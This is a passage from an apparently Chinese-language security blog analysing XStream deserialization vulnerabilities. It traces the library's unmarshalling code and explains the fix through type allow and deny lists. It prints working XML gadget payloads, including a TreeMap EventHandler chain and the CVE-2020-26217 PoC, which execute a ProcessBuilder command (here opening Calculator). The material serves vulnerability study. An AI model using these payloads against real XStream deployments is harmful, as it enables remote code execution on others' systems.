(!converter.canConvert(type)) &#123;</span><br><span class="line">        ConversionException e = <span class="keyword">new</span> ConversionException(<span class="string">"Explicit selected converter cannot handle type"</span>);</span><br><span class="line">        e.add(<span class="string">"item-type"</span>, type.getName());</span><br><span class="line">        e.add(<span class="string">"converter-type"</span>, converter.getClass().getName());</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//把type转化成对应的object</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.convert(parent, type, converter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看<code>defaultImplementationOf</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728215949165.png" alt="image-20210728215949165" style="zoom:50%;"><p>看到他返回的是<code>java.util.TreeSet</code>的类对象，也就是type的结果</p><p>接下来根据type找到对应的converter，也就进入<code>lookupConverterForType</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Converter <span class="title">lookupConverterForType</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//先查询缓存的类型对应的转换器集合</span></span><br><span class="line">    Converter cachedConverter = (Converter)<span class="keyword">this</span>.typeToConverterMap.get(type);</span><br><span class="line">    <span class="keyword">if</span> (cachedConverter != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">//如果在缓存中找得到，就返回找到的缓存转换器</span></span><br><span class="line">        <span class="keyword">return</span> cachedConverter;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Iterator iterator = <span class="keyword">this</span>.converters.iterator();</span><br><span class="line"></span><br><span class="line">        Converter converter;</span><br><span class="line">      <span class="comment">// 开始遍历，知道找到可以转换TreeSet类型的Converter</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!iterator.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"No converter specified for "</span> + type);</span><br><span class="line">            &#125;</span><br><span class="line">            converter = (Converter)iterator.next();</span><br><span class="line">        &#125; <span class="keyword">while</span>(!converter.canConvert(type));</span><br><span class="line"><span class="comment">// 找到之后就放在缓存中</span></span><br><span class="line">        <span class="keyword">this</span>.typeToConverterMap.put(type, converter);</span><br><span class="line">      <span class="comment">// 将匹配的converter返回</span></span><br><span class="line">        <span class="keyword">return</span> converter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>convert</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">convert</span><span class="params">(Object parent, Class type, Converter converter)</span> </span>&#123;</span><br><span class="line">    Object result;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.parentStack.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = <span class="keyword">this</span>.parentStack.peek();</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.values.containsKey(result)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.values.put(result, parent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取reference标签的内容</span></span><br><span class="line">    String attributeName = <span class="keyword">this</span>.getMapper().aliasForSystemAttribute(<span class="string">"reference"</span>);</span><br><span class="line">    String reference = attributeName == <span class="keyword">null</span> ? <span class="keyword">null</span> : <span class="keyword">this</span>.reader.getAttribute(attributeName);</span><br><span class="line">    Object cache;</span><br><span class="line">    <span class="keyword">if</span> (reference != <span class="keyword">null</span>) &#123;</span><br><span class="line">        cache = <span class="keyword">this</span>.values.get(<span class="keyword">this</span>.getReferenceKey(reference));</span><br><span class="line">        <span class="keyword">if</span> (cache == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ConversionException ex = <span class="keyword">new</span> ConversionException(<span class="string">"Invalid reference"</span>);</span><br><span class="line">            ex.add(<span class="string">"reference"</span>, reference);</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = cache == NULL ? <span class="keyword">null</span> : cache;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//如果reference字段内容为空就到这里，获取当前标签</span></span><br><span class="line">        cache = <span class="keyword">this</span>.getCurrentReferenceKey();</span><br><span class="line">        <span class="keyword">this</span>.parentStack.push(cache);</span><br><span class="line">        result = <span class="keyword">super</span>.convert(parent, type, converter);</span><br><span class="line">        <span class="keyword">if</span> (cache != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.values.put(cache, result == <span class="keyword">null</span> ? NULL : result);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.parentStack.popSilently();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来到这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object result = converter.unmarshal(<span class="keyword">this</span>.reader, <span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>通过匹配获取到的converter，调用<code>unmarshal</code>方法，进行xml解析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> </span>&#123;</span><br><span class="line">    TreeSet result = <span class="keyword">null</span>;</span><br><span class="line">  <span class="comment">//判断是否存在comparator，如果不存在，则返回NullComparator对象。</span></span><br><span class="line">    Comparator unmarshalledComparator = <span class="keyword">this</span>.treeMapConverter.unmarshalComparator(reader, context, (TreeMap)<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">boolean</span> inFirstElement = unmarshalledComparator <span class="keyword">instanceof</span> Null;</span><br><span class="line">    Comparator comparator = inFirstElement ? <span class="keyword">null</span> : unmarshalledComparator;</span><br><span class="line">    TreeMap treeMap;</span><br><span class="line">    <span class="keyword">if</span> (sortedMapField != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// possibleResult也是创建的是一个空的TreeSet对象。而后则是一些赋值，就没必要一一去看了。</span></span><br><span class="line">        TreeSet possibleResult = comparator == <span class="keyword">null</span> ? <span class="keyword">new</span> TreeSet() : <span class="keyword">new</span> TreeSet(comparator);</span><br><span class="line">        Object backingMap = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            backingMap = sortedMapField.get(possibleResult);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var11) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"Cannot get backing map of TreeSet"</span>, var11);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (backingMap <span class="keyword">instanceof</span> TreeMap) &#123;</span><br><span class="line">            treeMap = (TreeMap)backingMap;</span><br><span class="line">            result = possibleResult;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            treeMap = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        treeMap = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (treeMap == <span class="keyword">null</span>) &#123;</span><br><span class="line">        PresortedSet set = <span class="keyword">new</span> PresortedSet(comparator);</span><br><span class="line">        result = comparator == <span class="keyword">null</span> ? <span class="keyword">new</span> TreeSet() : <span class="keyword">new</span> TreeSet(comparator);</span><br><span class="line">        <span class="keyword">if</span> (inFirstElement) &#123;</span><br><span class="line">            <span class="keyword">this</span>.addCurrentElementToCollection(reader, context, result, set);</span><br><span class="line">            reader.moveUp();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.populateCollection(reader, context, result, set);</span><br><span class="line">        <span class="keyword">if</span> (set.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result.addAll(set);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//重点部分来了！！！</span></span><br><span class="line">        <span class="keyword">this</span>.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);</span><br></pre></td></tr></table></figure><p>跟进看：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728231700354.png" alt="image-20210728231700354" style="zoom:45%;"><p>进入90行的<code>putCurrentEntryIntoMap</code>：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728231815568.png" alt="image-20210728231815568" style="zoom:50%;"><p>方法内的target参数就是sortedMap，可以看到这里读取标签内的内容并缓存到target这个Map中。</p><p>返回上一级方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728232032919.png" alt="image-20210728232032919" style="zoom:45%;"><p>继续往下，来到<code>populateMap</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728232101565.png" alt="image-20210728232101565" style="zoom:50%;"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">populateMap</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, <span class="keyword">final</span> Map target)</span> </span>&#123;</span><br><span class="line">    TreeSetConverter.<span class="keyword">this</span>.populateCollection(reader, context, <span class="keyword">new</span> AbstractList() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> target.put(object, object) != <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(<span class="keyword">int</span> location)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> target.size();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解读：这里就是调用<code>populateCollection</code>用来循环遍历子标签中的元素并添加到集合中。</p><p>继续跟，来到这里：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728234358975.png" alt="image-20210728234358975" style="zoom:50%;"><p>进入<code>addCurrentElementToCollection</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728234507693.png" alt="image-20210728234507693" style="zoom:50%;"><p>再进入<code>readItem</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728234526757.png" alt="image-20210728234526757" style="zoom:50%;"><p>这里readItem做的事情和前面的一样：</p><p>依然还是继续读取标签内容，并且获取转换成对应的类，最后将类添加到target中。</p><p>由于我们的payload是一个动态代理类，会来到<code>com.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshal</code>这里：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728235219065.png" alt="image-20210728235219065"></p><p>这里的hander就是我们传入的EventHandler，相当于被包装成了动态代理类proxy，proxy返回。</p><p>一路返回，在<code>com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap</code>这里proxy被触发：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728235502388.png" alt="image-20210728235502388"></p><p>总结几个关键步骤：</p><ul><li>TreeUnmarshaller#start开始解析xml</li><li>HierarchicalStreams#readClassType通过标签获取Mapper中对应的Class对象</li><li>TreeUnmarshaller#convertAnother将Class对象转换为对应的Java对象<ul><li>mapper.defaultImplementationOf()查找Class类的实现类，根据实现类获取对应的converter</li><li>convert方法返回object对象<ul><li>调用对应converter的unmarshall方法继续解析子节点</li></ul></li></ul></li></ul><p>如何触发的？</p><p>string标签会被识别出StringConverter转换器来解析出string标签内的字符串test；</p><p>dynamic-proxy标签会被识别出对应的DynamicProxyConverter转换器来解析出动态代理类对象；</p><p>由于<code>TreeMap.putAll()</code>被调用，那么TreeSetConverter会对比两个子元素即调用$Proxy0.compareTo()来比较，而dynamic-proxy标签内实现了Comparable接口，因此由动态代理机制会触发dynamic-proxy标签内的handler标签指向的EventHandler类方法，从而利用反射机制实现任意代码执行。</p><h3 id="基于TreeMap"><a href="#基于TreeMap" class="headerlink" title="基于TreeMap"></a>基于TreeMap</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>fookey<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foovalue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210729213929631.png" alt="image-20210729213929631"></p><p>调试：先说结论，还是在putAll处触发</p><p>只不过这次的涉及到的转换器是TreeMapConverter，整个过程先在treemap里面放一个entry，string作为key值向里面添加。引发compareTo，handler被调用，漏洞触发。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>若版本号&gt;=1.4.7，XStream提供了一个安全框架供用户使用，但必须手工设置，建立黑白名单机制进行过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XStream.addPermission(TypePermission);</span><br><span class="line">XStream.allowTypes(Class[]);</span><br><span class="line">XStream.allowTypes(String[]);</span><br><span class="line">XStream.allowTypesByRegExp(String[]);</span><br><span class="line">XStream.allowTypesByRegExp(Pattern[]);</span><br><span class="line">XStream.allowTypesByWildcard(String[]);</span><br><span class="line">XStream.allowTypeHierary(Class);</span><br><span class="line">XStream.denyPermission(TypePermission);</span><br><span class="line">XStream.denyTypes(Class[]);</span><br><span class="line">XStream.denyTypes(String[]);</span><br><span class="line">XStream.denyTypesByRegExp(String[]);</span><br><span class="line">XStream.denyTypesByRegExp(Pattern[]);</span><br><span class="line">XStream.denyTypesByWildcard(String[]);</span><br><span class="line">XStream.denyTypeHierary(Class);</span><br></pre></td></tr></table></figure><p>在1.4.10版本之后，XStream提供了XStream.setupDefaultSecurity()函数来设置XStream反序列化类型的默认<strong>白名单</strong>，部分白名单是Xstream默认的，用户可以直接调用。</p><h1 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h1><p>XStream：1.4.13</p><h2 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>一种黑名单的绕过方式</p><h2 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h2><p>来自官网的PoC：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">'java.io.SequenceInputStream'</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">'javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">'javax.imageio.spi.FilterIterator'</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">'java.util.ArrayList$Itr'</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">'javax.imageio.ImageIO$ContainsFilter'</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">'java.io.ByteArrayInputStream'</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span 